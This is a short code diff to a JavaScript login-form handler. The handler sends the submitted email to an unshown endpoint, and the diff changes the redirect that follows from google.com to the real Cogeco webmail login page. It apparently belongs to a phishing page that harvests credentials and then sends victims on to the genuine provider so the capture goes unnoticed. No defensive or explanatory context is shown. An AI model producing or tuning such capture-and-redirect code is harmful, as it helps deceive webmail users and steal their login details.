@@ -23,7 +23,7 @@ form.addEventListener("submit", async (e) => {
       body: JSON.stringify({ email })
     });
 
-    window.location.href = "https://www.google.com/";
+    window.location.href = "https://wm.cogeco.ca/am/XUI/?locale=en";
   } catch (err) {
     console.error("Error sending login event:", err);
     window.location.href = "https://www.google.com/";
